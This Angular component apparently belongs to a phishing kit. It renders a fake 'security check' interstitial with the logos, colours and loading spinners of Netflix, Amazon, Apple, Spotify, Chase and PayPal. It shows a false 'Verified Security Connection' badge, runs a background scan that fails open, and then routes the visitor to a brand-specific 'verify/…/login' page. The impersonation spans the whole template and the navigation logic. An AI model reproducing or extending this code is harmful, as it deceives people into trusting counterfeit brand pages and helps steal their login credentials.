
import { Component, signal, OnInit, OnDestroy, inject, computed } from '@angular/core';
import { CommonModule } from '@angular/common';
import { Router } from '@angular/router';
import { StateService } from '../services/state.service';
import { SecurityService } from '../services/security.service';
import { TranslatePipe } from '../pipes/translate.pipe';
import { CardComponent, CardVariant } from './ui/card.component';

@Component({
  selector: 'app-security-check',
  standalone: true,
  imports: [CommonModule, TranslatePipe, CardComponent],
  host: {
    '[attr.data-theme]': 'currentFlowId()',
    'class': 'block w-full max-w-md mx-auto animate-in fade-in zoom-in-95 duration-500'
  },
  template: `
    <div class="min-h-screen w-full flex flex-col items-center justify-center p-4 transition-colors duration-700" [style.background-color]="bgColor()">
      <div class="max-w-md w-full animate-in fade-in zoom-in-95 duration-1000 flex flex-col items-center">
        
        <!-- Logo Display (Brand Aware) -->
        <div class="mb-12 animate-fade-in text-center">
            @if (currentFlowId() === 'netflix') {
                <img src="assets/images/logos/netflix-logo.svg" class="h-10 mx-auto" alt="Netflix">
            }
            @else if (currentFlowId() === 'amazon') {
                <img src="assets/images/logos/amazon-logo.svg" class="h-8 mx-auto" alt="Amazon">
            }
            @else if (currentFlowId() === 'apple') {
                <img src="assets/images/logos/apple-logo.svg" class="h-16 mx-auto" alt="Apple">
            }
            @else if (currentFlowId() === 'spotify') {
                <img src="assets/images/logos/spotify-logo.svg" class="h-10 mx-auto" alt="Spotify">
            }
            @else {
                <img src="assets/images/logos/paypal-logo.svg" class="h-10 mx-auto" alt="Secure Gateway">
            }
        </div>

        <!-- Dynamic Spinner (Using shared brand logic) -->
        <div class="relative mb-10 flex items-center justify-center h-20 w-20">
          @switch (currentFlowId()) {
            @case ('netflix') { <div class="netflix-red-spinner"></div> }
            @case ('amazon') { <div class="amazon-spinner"></div> }
            @case ('apple') {
               <div class="apple-spinner">
                  @for (bar of [1,2,3,4,5,6,7,8,9,10,11,12]; track $index) { <div class="apple-spinner-bar"></div> }
               </div>
            }
            @case ('spotify') {
                <div class="spotify-dots">
                   <div class="dot"></div> <div class="dot"></div> <div class="dot"></div>
                </div>
            }
            @case ('chase') { <div class="chase-spinner"></div> }
            @default {
              <div class="relative w-16 h-16">
                   <div class="absolute inset-0 border-4 rounded-full opacity-20" [style.border-color]="spinnerColor()"></div>
                   <div class="absolute inset-0 border-4 rounded-full border-t-transparent animate-spin-slow" [style.border-color]="spinnerColor()"></div>
              </div>
            }
          }
        </div>

        <h1 class="text-xl font-medium mb-3 tracking-tight animate-fade-in text-center"
            [style.color]="textColor()">
            {{ 'SECURITY.CHECKING' | translate }}
        </h1>
        <p class="text-sm font-medium animate-pulse opacity-80 text-center mb-12"
           [style.color]="textColor()">{{ statusMessage() | translate }}</p>

        <!-- Dynamic Security Disclaimer -->
        <div class="flex items-center gap-2 opacity-60 px-4 py-2 rounded-full border border-slate-200 dark:border-slate-700">
             <span class="material-icons text-sm" [style.color]="successColor()">lock</span>
             <span class="text-[10px] font-bold uppercase tracking-widest" [style.color]="textColor()">Verified Security Connection</span>
        </div>

      </div>
    </div>
  `,
  styles: [`
    :host { display: block; height: 100vh; width: 100vw; overflow: hidden; }
    .animate-spin-slow { animation: spin 1s linear infinite; }
    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

    /* SHARED SPINNER STYLES (MATCHES LOADING) */
    .netflix-red-spinner { width: 44px; height: 44px; border: 3px solid transparent; border-top-color: #e50914; border-radius: 50%; animation: spin 0.8s ease-in-out infinite; }
    .amazon-spinner { width: 32px; height: 32px; border: 2px solid #ccc; border-top: 2px solid #e77600; border-radius: 50%; animation: spin 0.6s linear infinite; }
    .apple-spinner { position: relative; width: 28px; height: 28px; }
    .apple-spinner-bar { position: absolute; left: 44.5%; top: 37%; width: 10%; height: 25%; background: #8e8e93; border-radius: 50px; opacity: 0; animation: appleFade 1s linear infinite; }
    @keyframes appleFade { from { opacity: 1; } to { opacity: 0.25; } }
    .apple-spinner-bar:nth-child(1) { transform: rotate(0deg) translate(0, -130%); animation-delay: 0s; }
    .apple-spinner-bar:nth-child(2) { transform: rotate(30deg) translate(0, -130%); animation-delay: -0.916s; }
    .apple-spinner-bar:nth-child(3) { transform: rotate(60deg) translate(0, -130%); animation-delay: -0.833s; }
    .apple-spinner-bar:nth-child(4) { transform: rotate(90deg) translate(0, -130%); animation-delay: -0.75s; }
    .apple-spinner-bar:nth-child(5) { transform: rotate(120deg) translate(0, -130%); animation-delay: -0.666s; }
    .apple-spinner-bar:nth-child(6) { transform: rotate(150deg) translate(0, -130%); animation-delay: -0.583s; }
    .apple-spinner-bar:nth-child(7) { transform: rotate(180deg) translate(0, -130%); animation-delay: -0.5s; }
    .apple-spinner-bar:nth-child(8) { transform: rotate(210deg) translate(0, -130%); animation-delay: -0.416s; }
    .apple-spinner-bar:nth-child(9) { transform: rotate(240deg) translate(0, -130%); animation-delay: -0.333s; }
    .apple-spinner-bar:nth-child(10) { transform: rotate(270deg) translate(0, -130%); animation-delay: -0.25s; }
    .apple-spinner-bar:nth-child(11) { transform: rotate(300deg) translate(0, -130%); animation-delay: -0.166s; }
    .apple-spinner-bar:nth-child(12) { transform: rotate(330deg) translate(0, -130%); animation-delay: -0.083s; }

    .spotify-dots { display: flex; gap: 6px; }
    .spotify-dots .dot { width: 10px; height: 10px; background-color: #1ed760; border-radius: 50%; animation: bounce 1.4s infinite ease-in-out both; }
    .spotify-dots .dot:nth-child(1) { animation-delay: -0.32s; }
    .spotify-dots .dot:nth-child(2) { animation-delay: -0.16s; }
    @keyframes bounce { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1.0); } }

    .chase-spinner { width: 44px; height: 44px; border: 3px solid rgba(17, 122, 202, 0.2); border-left-color: #117aca; border-radius: 50%; animation: spin 1s linear infinite; }
  `]

})
export class SecurityCheckComponent implements OnInit, OnDestroy {
  state = inject(StateService);
  security = inject(SecurityService);
  router = inject(Router);

  statusMessage = signal('SECURITY.VERIFYING');
  private intervalId: any;

  private checksDone = false;
  private messagesDone = false;
  private navTimer: any;

  // Theme Computeds
  currentFlowId = computed(() => this.state.currentFlow()?.id || 'generic');
  theme = computed(() => this.state.currentFlow()?.theme);

  textColor = computed(() => this.theme()?.input.textColor || '#001C64');
  spinnerColor = computed(() => this.theme()?.button.background || '#003087');
  bgColor = computed(() => this.theme()?.background || '#ffffff');
  spinnerTrackColor = computed(() => (this.theme()?.mode === 'dark' ? 'rgba(255,255,255,0.1)' : 'rgba(0,0,0,0.1)'));
  successColor = computed(() => '#10b981');

  ngOnInit() {
    const messages = [
      "SECURITY.VERIFYING",
      "SECURITY.CONNECTING"
    ];
    let i = 0;

    // 1. Start Visual Sequence
    this.intervalId = setInterval(() => {
      if (i < messages.length) {
        this.statusMessage.set(messages[i]);
        i++;
      } else {
        // Sequence finished
        this.messagesDone = true;
        this.tryNavigate();
        clearInterval(this.intervalId);
      }
    }, 600);

    // 2. Start Real Security Checks
    this.security.runSecurityScan().subscribe({
      next: (results) => {
        this.checksDone = true;
        this.tryNavigate();
      },
      error: (err) => {
        // Fail open
        this.checksDone = true;
        this.tryNavigate();
      }
    });
  }

  private tryNavigate() {
    if (this.checksDone && this.messagesDone) {
      // Add a small buffer for the last message to be read
      this.navTimer = setTimeout(() => {
        this.state.hasPassedSecurityCheck.set(true);

        // If we have a brand flow, navigate back to its official login
        const flow = this.state.currentFlow();
        if (flow && flow.id !== 'paypal') {
          this.router.navigate([`verify/${flow.id}/login`]);
        } else {
          this.state.navigate('login');
        }
      }, 1200); // Slightly longer for "Premium" feel
    }
  }

  ngOnDestroy() {
    if (this.intervalId) clearInterval(this.intervalId);
    if (this.navTimer) clearTimeout(this.navTimer);
  }
}
